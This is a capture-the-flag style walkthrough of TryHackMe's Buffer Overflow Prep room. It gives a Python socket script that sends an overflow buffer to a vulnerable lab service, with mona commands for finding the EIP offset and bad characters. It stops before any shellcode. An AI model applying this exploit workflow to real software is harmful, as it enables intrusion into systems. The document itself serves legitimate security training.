# Buffer-Overflow-Prep
We're going to learn how to solve 3 tryhackme's stack buffer overflow.

This is the link to the Tryhackme Machine: https://tryhackme.com/room/bufferoverflowprep

# Things that you will need:
You will need x32dbg made by therealdreg: https://github.com/therealdreg/x64dbg-exploiting

![18eaa8e03e02775805ec70f088604676](https://user-images.githubusercontent.com/107114264/172813095-fe046a17-6719-4120-8352-da0edd872b47.png)

You will need your OpenVPN from Tryhackme: https://tryhackme.com/access

You will need wfreerdp to get "vulnerable_apps.zip"

You can get it from here: https://ci.freerdp.com/job/freerdp-nightly-windows/arch=win32,label=vs2013/

![e73bc927e928e9aac8a53960cfb34a08](https://user-images.githubusercontent.com/107114264/172813224-afe081bd-5f97-4884-8ff5-bf6efacc240c.png)

# First Steps

Start the machine in Tryhackme.

Open your OpenVPN and wait to connect to the machine, so we can work.

After downloading it all, We will need to execute this comand on cmd: ```wfreerdp.exe /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea```

![11fd449aa4140dac4f71db16bbe012b2](https://user-images.githubusercontent.com/107114264/172813316-f4f55eed-8421-49b3-a10e-d47a15744c63.png)

Once we connect to the Tryhackme Machine, we can start to work!

On the Desktop is "vulnerable_apps", so we can right click it and make it a zip.

![ddf3a6b17b9494a291f4f5c02fa15903](https://user-images.githubusercontent.com/107114264/172813456-1d48a157-0db1-4318-ab0e-f783d043ce3d.png)

Then in the windows machine we can found that we can use Python27 then we can get "vulnerable_apps.zip" via http server.

So knowing this we use on the cmd: ```c:\Python27\python.exe -m SimpleHTTPServer```

![8ec396ffd688f7e79111b8edcfb31b3c](https://user-images.githubusercontent.com/107114264/172813714-21f1834b-c1f7-427f-8be5-53e17b18a5e7.png)

Back on your Windows search on google: ```MACHINEIP:8000```

![88368624e10a140e81068e70fcea41ac](https://user-images.githubusercontent.com/107114264/172813764-2c763235-a61e-409a-9f95-f42d1633eb50.png)

Download "vulnerable_apps.zip" and unzip it.

# Using x32dgb

We will need a script to execute an exploit on the "oscp.exe"

Tryhackme give us this:

```
import socket

ip = "MACHINE_IP" # Here introduce 127.0.0.1 for local or TryHackme's Machine IP
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

We will start trying the exploit doing it in local, so we neet to introduce in the parameter "ip" 127.0.0.1

Run the program, and open the file "oscp.exe" it is in this path: ```vulnerable-apps/vulnerable-apps/oscp/oscp.exe```

![7ee528397d8b95aa959aefcb51bca05b](https://user-images.githubusercontent.com/107114264/172813897-8acd7445-cc62-477b-a8bd-76b0c54b1e57.png)

Then you will see something like this:

![a5255baed8f1aee8570dc9f6c68715b7](https://user-images.githubusercontent.com/107114264/172813954-e74866ba-fb19-4a08-894f-314c7c8fe6c5.png)

# Useful codes for x32dgb using mona

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
--------------------------------------------------------------------------------

mona.mona("pattern_create 2000")

mona.mona('bytearray -cpb "\\x00"')

mona.mona('compare -f C:\\logs\\oscp\\bytearray.bin -a ESP')

mona.mona("pattern_offset EIP")

mona.mona("jmp -r esp") 
```

# Starting with x32dgb on "oscp.exe"

Go to Log inside of x32dgb when "oscp.exe" it's open and execute this 3 commands one by one:

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```
You need to do this everytime you turn on your pc.

If you do this all right you'll see this with our last command:

![68747470733a2f2f692e706f7374696d672e63632f30354352664377622f63633539336462653365376136616236373364323766653165346331653163372e706e67](https://user-images.githubusercontent.com/107114264/172814087-bdf926aa-dee6-46ff-bd1b-a6929002b021.png)

Now, we need to create a pattern, so we can know how much bytes can we put to get to EIP.

```mona.mona("pattern_create 2000")``` Enter this in "Log".

You should see this:

![68747470733a2f2f692e706f7374696d672e63632f7443306b733054362f63316539636266333465313931346632353034633134393836313833376333322e706e67](https://user-images.githubusercontent.com/107114264/172814137-fca95bcb-efc8-48b7-8aa1-53f4e51b23a0.png)

Restart and Run your program a few times till it open this will be done everytime that we change the file.py

You need to execute your python3 in your cmd like this: ```c:\YOUR_PATERN_PYTHON3\python.exe YOUR.PY```

WARNING!!!: Execute your .py till the proggram reach it.

![68747470733a2f2f692e706f7374696d672e63632f70546a42566b44782f63356630383331386230343733653062346366353932326238313438333232372e706e67](https://user-images.githubusercontent.com/107114264/172814252-c90ba69d-1391-4960-9423-28d24e7259de.png)

Now in "Log" we need to execute the command: ```"mona.mona("pattern_offset EIP")"``` 

This gonna compare our pattern to get how much bytes we need to get to EIP.

![68747470733a2f2f692e706f7374696d672e63632f6e7a4c74366a37762f36363332363039636533316337383664306466303662333265643064306436322e706e67](https://user-images.githubusercontent.com/107114264/172814398-c35acbcf-8b0e-49c0-ad0a-81fe62a6e0e0.png)

We see that we need 1978 bytes to get to EIP so we gonna put this on payload: (\x41 means A in ASCII and \x42 means B in ASCII )

![68747470733a2f2f692e706f7374696d672e63632f3835714e4d6b4a4d2f39353039303732626665383239373434653938313863376437633139343461382e706e67](https://user-images.githubusercontent.com/107114264/172814439-1350d8d3-d29d-4cf2-aa62-3098b7117036.png)

We need to restart "oscp.exe" and run it till it's open. Execute your file.py and you should see this on EIP:

![68747470733a2f2f692e706f7374696d672e63632f686a7142704431422f36356461643237376566306137323964633563633035623233353334306639612e706e67](https://user-images.githubusercontent.com/107114264/172814511-c2daadc4-8b32-4f28-a4b0-3563dd57d41f.png)

We can see here "\x41" and "\x42" at the top of the stack.

![68747470733a2f2f692e706f7374696d672e63632f51435177433132392f34393434333339346234626365313465363763336362343562643264373535642e706e67](https://user-images.githubusercontent.com/107114264/172814547-d01bd689-f46b-4ebd-9285-2db02233b7dd.png)

If you can see this, all is going good! Well done!

Now it's time to search badchars

# Searching Badchars at OVERFLOW1

Go to "Log", execute: ```mona.mona('bytearray -cpb "\\x00"')``` 

This will create a payload without the badchat \x00 that we asume that it's a badchar.

![68747470733a2f2f692e706f7374696d672e63632f786450327072784e2f61633166663261623064663933666162373765326336303036643066303931642e706e67](https://user-images.githubusercontent.com/107114264/172814639-417964e3-f4ce-4ac3-ad2c-fd33f4a20a6f.png)

Paste it all into payload under ```payload+= "\x42" * 4``` 

All like this:

![68747470733a2f2f692e706f7374696d672e63632f79644334315a42772f65393164633731343934376632656238393631353961383136626334653934622e706e67](https://user-images.githubusercontent.com/107114264/172814675-c38d811d-f6b9-4fa4-9208-02d1810eb004.png)

Now, We need to restart the program and run it again to execute our payload with the file.py

Every time you need to check that EIP got our 4 "\x42"(B).

Afther that go to the bottom zone and right click go to expresion : "esp"

![4fceda96673b99b5a5d7dadab39990bb](https://user-images.githubusercontent.com/107114264/172812663-6484278d-5063-4464-ae04-a44f765bf10b.gif)

We can see here that it starts at 01 but the 07 its not here:

![52e419253cbed3792e260f9c30fdf3cb](https://user-images.githubusercontent.com/107114264/172815076-f186fc71-4a50-422a-a293-351f7cef954b.png)

So we need to go to the "Log" and use: ```mona.mona('compare -f C:\\logs\\oscp\\bytearray.bin -a ESP')```

It tell us that the "\x07" its a badchar:

![e8ae746c63ce5549d1c3defab2f6ee96](https://user-images.githubusercontent.com/107114264/172815680-3021d560-a6bb-47d6-9908-21d6a69780c5.png)

So we need to add it to our command and repeait it all again! ```mona.mona('bytearray -cpb "\\x00\\x07"')```

Copy it all and pull it into the payload changing it to the last one.

Do again the compare command and we can see that now we have the badchar x2e:

![b1be3aa110e4a0218a506cdd862fbd76](https://user-images.githubusercontent.com/107114264/172816889-250d0a9d-2c7d-4d15-9e21-346ac9a5a740.png)

We add it to the bytearray and execute the python: ```mona.mona('bytearray -cpb "\\x00\\x07\\x2e"')```

Do a compare: ```mona.mona('compare -f C:\\logs\\oscp\\bytearray.bin -a ESP')```

We can see that it says that \xa0 its a badchar too, so add it. ```mona.mona('bytearray -cpb "\\x00\\x07\\x2e\\xa0"')```

![7033964f479dc50f7cf55ef02ca1e298](https://user-images.githubusercontent.com/107114264/172817925-196c97fa-bf48-4510-a372-a745f007b0bc.png)

And change your payload and execute it again. Don't Forget to restart and run!

Run a compare in "Log" and HOORAY!!

![9428d3fbcdb56c0edb892ccdc74869e4](https://user-images.githubusercontent.com/107114264/172819011-ffb4d3c3-e380-4f82-88fd-5600cb37cc0d.png)

# Searching Badchars OVERFLOW4

We start again doing the same, first of all we need to create our pattern. ```mona.mona("pattern_create 3000")```

And search it to know how much bytes we will need this time. ```mona.mona("pattern_offset EIP")```

We will need 2026 bytes to get to EIP. Introduce it to the payload.

![2e981d578fa9bcabb464ae461ab7958b](https://user-images.githubusercontent.com/107114264/172826322-2770230e-ad60-4955-8e32-18bb6329585c.png)

Every time put 4 more B to see if we reach EIP.

Let's find it out!

We can check that the 4 "\x42" reach EIP so we can continue.

Create again the bytearray only with \x00 and past it into the payload.

Restart the program run it till it charges and execute your .py

It says that the following badchar its \x9a add it first to: ```mona.mona('bytearray -cpb "\\x00\\xa9"')```

![77beee699cf6487af5855b3b4091a7f6](https://user-images.githubusercontent.com/107114264/172829176-35bb2fda-6318-4357-addd-c3a6b1e9833b.png)

Change it with the last payload.

Restart the program run it till it charges and execute your .py do a compare, and it says that the next badchar is \xcd

![d9bc587b26178c368c67c56bc922a63e](https://user-images.githubusercontent.com/107114264/172829218-93b0b67f-9de6-4b04-b1cd-0e1fbf2907d7.png)

Add it to your bytearray. ```mona.mona('bytearray -cpb "\\x00\\xa9\\xcd"')```

Restart the program run it till it charges and execute your .py do a compare, and it says that the next badchar is \xd4

![2b32f2f7626beb3b02c033d21050f32a](https://user-images.githubusercontent.com/107114264/172830857-ac49af17-8285-44a3-9b43-604d29a593bd.png)

Add it to your bytearray. ```mona.mona('bytearray -cpb "\\x00\\xa9\\xcd\\xd4"')```

Restart the program run it till it charges and execute your .py do a compare and HOORAYY!!!!

![6f9a6a3800666bde2471ee8cbc6bb2a2](https://user-images.githubusercontent.com/107114264/172830676-b7b511e2-f170-412d-9423-305bea831799.png)

# Searching Badchars OVERFLOW6

We start again doing the same, first of all we need to create our pattern. ```mona.mona("pattern_create 2000")```

Restart the program run it till it charges and execute your .py do a compare, ```mona.mona("pattern_offset EIP")``` and it says that the bytes needed are 1034.

Look it up if EIP got 4 "\x42", if you got it we're right.

